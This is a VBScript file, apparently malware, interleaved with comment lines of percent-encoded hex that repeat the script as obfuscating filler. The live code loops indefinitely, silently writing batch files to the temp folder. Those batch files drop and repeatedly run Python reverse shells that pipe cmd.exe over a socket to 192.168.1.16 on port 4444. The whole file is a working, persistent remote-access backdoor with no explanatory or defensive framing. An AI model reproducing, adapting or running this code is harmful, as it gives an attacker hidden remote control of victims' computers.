' %44%69%6d%20%74%65%6d%70%0a%74%65%6d%70%20%3d%20%22%25%74%65%6d%70%25%22%20%0a%44%69%6d%20%66%73%6f%0a%53%65%74%20
' %66%73%6f%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%53%63%72%69%70%74%69%6e%67%2e%46%69%6c%65%53%79%73%74%65%6d%4f
' %62%6a%65%63%74%22%29%0a%44%6f%0a%20%20%20%20%20%20%20%20%49%66%20%66%73%6f%2e%46%69%6c%65%45%78%69%73%74%73%28%74%65%6d%70%20%26
' %20%22%5c%70%72%6f%31%2e%62%61%74%22%29%20%54%68%65%6e%0a%20%20%20%20%20%20%20%20%20%20%20%20%44%69%6d%20%6f%62%6a%53%68%65%6c%6c%0a%20%2
' 0%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%6a%53%68%65%6c%6c%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%57%53%63%72%69%70%74
' %2e%53%68%65%6c%6c%22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%53%68%65%6c%6c%2e%52%75%6e%20%74%65%6d%70%20%26%20%22%5c%70%72%6f%
' 31%2e%62%61%74%22%2c%20%30%2c%20%46%61%6c%73%65%0a%20%20%20%20%20%20%20%20%45%6c%73%65%0a%20%20%20%20%20%20%20%20%20%20%20%20%44%69%6d%20%74
' %65%6d%70%5f%64%69%72%0a%20%20%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%6a%53%68%65%6c%6c%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%7
Dim temp
temp = "%temp%" 
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Do
' 4%28%22%57%53%63%72%69%70%74%2e%53%68%65%6c%6c%22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%74%65%6d%70%5f%64%69%72%20%3d%20%6f%62%6a%53%68%6
' 5%6c%6c%2e%45%78%70%61%6e%64%45%6e%76%69%72%6f%6e%6d%65%6e%74%53%74%72%69%6e%67%73%28%22%25%74%65%6d%70%25%22%29%0a%20%20%20%20%20%20%20%20%20
' %20%20%20%6f%62%6a%53%68%65%6c%6c%2e%43%75%72%72%65%6e%74%44%69%72%65%63%74%6f%72%79%20%3d%20%74%65%6d%70%5f%64%69%72%0a%20%20%20%20%20%20%2
' 0%20%20%20%20%20%53%65%74%20%6f%62%6a%46%53%4f%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%53%63%72%69%70%74%69%6e%67%2e%46%69%6c%65%5
' 3%79%73%74%65%6d%4f%62%6a%65%63%74%22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%6a%46%69%6c%65%20%3d%20%6f%62%6a%46%53%4f%
' 2e%43%72%65%61%74%65%54%65%78%74%46%69%6c%65%28%74%65%6d%70%5f%64%69%72%20%26%20%22%5c%70%72%6f%31%2e%62%61%74%22%29%0a%20%20%20%20%20%20%20%
' 20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%40%65%63%68%6f%20%6f%66%66%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6
' f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%3a%6c%6f%6f%70%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%7
' 2%69%74%65%4c%69%6e%65%20%22%73%65%74%20%46%49%4c%45%3d%25%74%65%6d%70%25%5c%73%68%31%2e%70%79%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62
' %6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%69%66%20%6e%6f%74%20%65%78%69%73%74%20%25%46%49%4c%45%25%20%28%22%0a%20%20%20%20%20%20%20%
' 20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%28%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%6
' 9%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%22%0a%20%20%20%20%20
' %20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%6f
If fso.FileExists(temp & "\pro1.bat") Then
            Dim objShell
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run temp & "\pro1.bat", 0, False
        Else
            Dim temp_dir
            Set objShell = CreateObject("WScript.Shell")
            temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
            objShell.CurrentDirectory = temp_dir
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFSO.CreateTextFile(temp_dir & "\pro1.bat")
            objFile.WriteLine "@echo off"
            objFile.WriteLine ":loop"
            objFile.WriteLine "set FILE=%temp%\sh1.py"
            objFile.WriteLine "if not exist %FILE% ("
' %73%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20
' %69%6d%70%6f%72%74%20%74%68%72%65%61%64%69%6e%67%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%
' 20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%73%75%62%70%72%6f%63%65%73%73%20%61%73%20%73%70%22%0a%20%20%20%20%20%20%20%2
' 0%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%74%69%6d%65
' %22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%
' 0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%64%65%
' 66%20%72%65%76%5e%28%5e%29%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%2
' 0%20%20%20%20%65%63%68%6f%20%20%20%20%70%20%3d%20%73%70%2e%50%6f%70%65%6e%5e%28%5b%27%63%6d%64%2e%65%78%65%27%5d%2c%20%73%74%64%69%6e%3d%73%7
' 0%2e%50%49%50%45%2c%20%73%74%64%6f%75%74%d%73%70%2e%50%49%50%45%2c%20%73%74%64%65%72%72%3d%73%70%2e%53%54%44%4f%55%54%5e%29%22%0a%20%20%20%20
' %20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%73%20%3d%20%73%
' 5%74%2e%73%6f%63%6b%65%74%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%
' 65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%6
' 9%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%74%72%79%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65
' %2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%73%2e%63%6f%6e%6e%65%63%74%5e%28%5e%28%
' 27%31%39%32%2e%31%36%38%2e%31%2e%31%36%27%2c%20%34%34%34%34%5e%29%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%
' 72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%65%78%63%65%70%74%20%43%6f%6e%6e%65%63%74%69%6f%6e%52%65%66%75%7
            objFile.WriteLine "    ("
            objFile.WriteLine "        echo import socket"
            objFile.WriteLine "        echo import os"
            objFile.WriteLine "        echo import threading"
            objFile.WriteLine "        echo import subprocess as sp"
            objFile.WriteLine "        echo import time"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo def rev^(^)^:"
            objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)"
            objFile.WriteLine "        echo    s = socket.socket^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    try:"
            objFile.WriteLine "        echo        s.connect^(^('192.168.1.16', 4444^)^)"
            objFile.WriteLine "        echo    except ConnectionRefusedError as e:"
            objFile.WriteLine "        echo        print^('refused ... Check if listener is running.'^)"
            objFile.WriteLine "        echo        return"
            objFile.WriteLine "        echo."
' 3%65%64%45%72%72%6f%72%20%61%73%20%65%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20
' %22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%70%72%69%6e%74%5e%28%27%72%65%66%75%73%65%64%20%2e%2e%2e%20%43%68%65%63%6b%20%69%66%
' 20%6c%69%73%74%65%6e%65%72%20%69%73%20%72%75%6e%6e%69%6e%67%2e%27%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74
' %65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46
' %69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%
' 69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%64%65%66%20%73%5f%6f%5e%28%5e%29%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62
' %6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%77%68%69%6c%65%20%54%72%75%65%5e%3a%22%0a%20%20%20%
' 20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%5
' e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%2
' 0%20%20%20%20%20%20%6f%75%74%70%75%74%20%3d%20%6f%73%2e%72%65%61%64%5e%28%70%2e%73%74%64%6f%75%74%2e%66%69%6c%65%6e%6f%5e%28%5e%29%2c%20%31%30%32%34%5e%29%22%0a%20%20%
            objFile.WriteLine "        echo    def s_o^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                output = os.read^(p.stdout.fileno^(^), 1024^)"
            objFile.WriteLine "        echo                if not output^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                s.sendall^(output^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error sending output:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    def r_i^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                data = s.recv^(1024^)"
            objFile.WriteLine "        echo                if not data^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                p.stdin.write^(data^)"
            objFile.WriteLine "        echo                p.stdin.flush^(^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error receiving input:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)"
            objFile.WriteLine "        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    time.sleep^(40^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo while True^:"
            objFile.WriteLine "        echo    rev^(^)"
            objFile.WriteLine "        echo    print^('Loading ...'^)"
            objFile.WriteLine "    ) > %FILE%"
            objFile.WriteLine ") else ("
            objFile.WriteLine "   python %FILE%"
            objFile.WriteLine "   timeout /t 80 >nul"
            objFile.WriteLine ")"
            objFile.WriteLine "goto loop"

            objFile.Close
            objShell.Run temp_dir & "\pro1.bat", 0, False
        End If
' 20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
' %20%69%66%20%6e%6f%74%20%6f%75%74%70%75%74%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%2
' 0%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6b%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%
' 74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%2e%73%65%6e%64%61%6c%6c%5e%28%6f%75%74%70%75%74%5e%29%2
' 2%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%2
' 0%65%78%63%65%70%74%20%45%78%63%65%70%74%69%6f%6e%20%61%73%20%65%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22
' %20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%72%69%6e%74%5e%28%27%45%72%72%6f%72%20%73%65%6e%64%69%6e%67%20%6f%75%74%70%75%74%
' 3a%27%2c%20%65%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%2
 If fso.FileExists(temp_dir & "\pro.bat") Then
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run temp_dir & "\pro.bat", 0, False
        Else
            Set objShell = CreateObject("WScript.Shell")
            temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
            objShell.CurrentDirectory = temp_dir
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFSO.CreateTextFile(temp_dir & "\pro.bat")
            objFile.WriteLine "@echo off"
            objFile.WriteLine ":loop"
            objFile.WriteLine "set FILE=%temp%\sh.py"
            objFile.WriteLine "if not exist %FILE% ("
            objFile.WriteLine "    ("
            objFile.WriteLine "        echo import socket"
            objFile.WriteLine "        echo import os"
            objFile.WriteLine "        echo import threading"
            objFile.WriteLine "        echo import subprocess as sp"
            objFile.WriteLine "        echo import time"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo def rev^(^)^:"
            objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)"
            objFile.WriteLine "        echo    s = socket.socket^(^)"
            objFile.WriteLine "        echo."
' 0%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6b%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20
' %20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%64%
' 65%66%20%72%5f%69%5e%28%5e%29%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6
' f%20%20%20%20%20%20%20%20%77%68%69%6c%65%20%54%72%75%65%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20
' %20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e
' %65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%64%61%74%61%20%3d%20%73%2e%72%65%63%76%5e%28%31%30%32%34%5e%29%22%0a%20%20%
            objFile.WriteLine "        echo    try:"
            objFile.WriteLine "        echo        s.connect^(^('192.168.1.16', 4444^)^)"
            objFile.WriteLine "        echo    except ConnectionRefusedError as e:"
            objFile.WriteLine "        echo        print^('refused ... Check if listener is running.'^)"
            objFile.WriteLine "        echo        return"
            objFile.WriteLine "        echo."
' 20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2
' 0%69%66%20%6e%6f%74%20%64%61%74%61%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%6
' 3%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6b%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69
' %6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%2e%73%74%64%69%6e%2e%77%72%69%74%65%5e%28%64%61%74%61%5e%29%22%0a%20%
' %6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%74%68%72%65%61%64%69%6e%67%2e%54%68%72%65%61%64%5e%28%74%61%72%67%65%74%3d%73%5f%6f%2c%20%64%61%65%6d%6f%6e%3d%
' 54%72%75%65%5e%29%2e%73%74%61%72%74%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%74%68%72%65%61%64%69%6e%67%2e%54%68%72%65%61%64%5e%28%74%61%72%67%65%74%3d%72%5f%69%2c%20%64%61%65%6d%6f%6e%3d%54%72%75%65%5e%29%2e%73%74%61%72%74%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%74%69%6d%65%2e%73%6c%65%65%70%5e%28%34%30%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%
' 22%20%20%20%20%20%20%20%20%6
' 5%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%77%68%69%6c%65%20%54%72%75%65%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%2
' 0%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%72%65%76%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%70%72%69%6e%74%5e%28%27%4c%6f%61%64%69%6e%67%20%2e%2e%2e%27%5e%29%22%0a%20%20%20%20%20
' %20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%29%20%3e%20%25%46%49%4c%45%25%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%
' 57%72%69%74%65%4c%69%6e%65%20%22%29%20%65%6c%73%65%20%28%22%0a%20%20%20%20%20%20%
' 20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%70%79%74%68%6f%6e%20%25%46%49%4c%45%25%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c
' %69%6e%65%20%22%20%20%20%74%69%6d%65%6f%75%74%20%2f%74%20%38%30%20%3e%6e%75%6c%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%67%6f%74%6f%20%6c%6f%6f%70%22%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%
' 6c%65%2e%43%6c%6f%73%65%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%53%68%65%6c%6c%2e%52%75%6e%20%74%65%6d%70%5f%64%69%72%20%26%20%22%5c%70%72%6f%31%2e%62%61%74%22%2c%20%30%2c%20%46%61%6c%73%65%0a%20%20%20%20%20%20%20%20%45%6e%64%20%49%66%0a%20%20%20%20%20%20%20%20%49%66%20%66%73%6f%2e%46%69%6c%65%45%78%69%73%74%73%28%74%65%6d%70%5f%64%69%72%20%26%20%22%5c%70%72%6f%2e%62%61%74%22%29%20%54%68%65%6e%0a%20%20%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%6a%53%68%65%6c%6c%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%57%53%63%72%69%70%74%2e%53%68%65%6c%6c
            objFile.WriteLine "        echo    def s_o^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                output = os.read^(p.stdout.fileno^(^), 1024^)"
            objFile.WriteLine "        echo                if not output^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                s.sendall^(output^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error sending output:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    def r_i^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                data = s.recv^(1024^)"
            objFile.WriteLine "        echo                if not data^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                p.stdin.write^(data^)"
            objFile.WriteLine "        echo                p.stdin.flush^(^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error receiving input:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)"
            objFile.WriteLine "        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    time.sleep^(30^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo while True^:"
            objFile.WriteLine "        echo    rev^(^)"
            objFile.WriteLine "        echo    print^('Loading ...'^)"
            objFile.WriteLine "    ) > %FILE%"
            objFile.WriteLine ") else ("
            objFile.WriteLine "   python %FILE%"
            objFile.WriteLine "   timeout /t 60 >nul"
            objFile.WriteLine ")"
            objFile.WriteLine "goto loop"

            objFile.Close
            objShell.Run temp_dir & "\pro.bat", 0, False
        End If
        WScript.Sleep 900000
Loop
' %22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%53%68%65
' %6c%6c%2e%52%75%6e%20%74%65%6d%70%5f%64%69%72%20%26%20%22%5c%70%72%6f%2e%62%61%74%22%2c%20%30%2c%20%46%61%6c%73%65%0a%20%20%20%20%20%20%20%20%45%6c%73%65%0a%20%20%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%
' %53%68%65%6c%6c%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%57%53%63%72%69%70%74%2e%53%68%65%6c%6c%22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%74%65%6d%70%5f%64%69%72%20%3d%20%6f%62%6a%53%68%65%6c%6c%2e%45%78%70%61%6e%64
' %45%6e%76%69%72%6f%6e%6d%65%6e%74%53%74%72%69%6e%67%73%28%22%25%74%65%6d%70%25%22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%53%68%65%6c%6c%2e%43%75%72%72%65%6e%74%44%69%72%65%63%74%6f%72%79%20%3d%20%74%65%6d%70%5f%64%69%72%0a%20%20%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%6a%46%53%4f%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%53%63%72%69%70%74%69%6e%67%2e%46%69%6c%65%53%79%73%74%65%6d%4f%62%6a%65%63%74%22%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%6a%46%69%6c%65%20%3d%20%6f%62%6a%46%53%4f%2e%43%72%65%61%74%65%54%65%78%74%46%69%6c%65%28%74%65%6d%70%5f%64%69%72%20%26%20%22%5c%70%72%6f%2e%62%61%74%22%29%0a%20%20%20%20%20%20%20%20
' %20%20%20%20%6f%62%6a%46%
' 69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%4
' 0%65%63%68%6f%20%6f%66%66%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%3a%6c%6f%6f%70%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%73%65%74%20%46%49%4c%45%
' 3d%25%74%65%6d%70%25%5c%73%68%2e%70%79%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%69%66%20%6e%6f%74%20%65%78%69%73%74%20%25%46%49%4c%45%25%20%28%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%28%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%
' 72%74%20%73%6f%63%6b%65%74%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%6f%73%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%74%68%72%65%61%64%69%6e%67%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%73%75%62%70%72%6f%63%65%73%73%20%61%73%20%73%70%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%2
